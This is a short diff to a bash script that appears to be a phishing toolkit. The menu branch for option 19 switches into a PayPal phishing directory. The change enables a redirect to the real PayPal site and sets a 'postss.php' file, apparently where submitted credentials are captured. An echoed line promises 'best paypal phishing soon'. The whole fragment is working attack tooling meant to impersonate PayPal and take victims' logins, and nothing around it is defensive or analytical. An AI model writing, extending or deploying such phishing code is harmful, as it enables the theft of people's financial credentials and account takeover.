@@ -1067,8 +1067,9 @@ function banner(){
 	elif [ $option = 19 ];then
                 cd $phish/paypal/
 		valu="19"
-		#reddc="TRUE"
-		#oldy="https://www.paypal.com"
+		reddc="TRUE"
+		FILE="postss.php"
+		oldy="https://www.paypal.com"
 		echo
 		msg "Will try to give you best paypal phishing soon!"
 		sleep 5
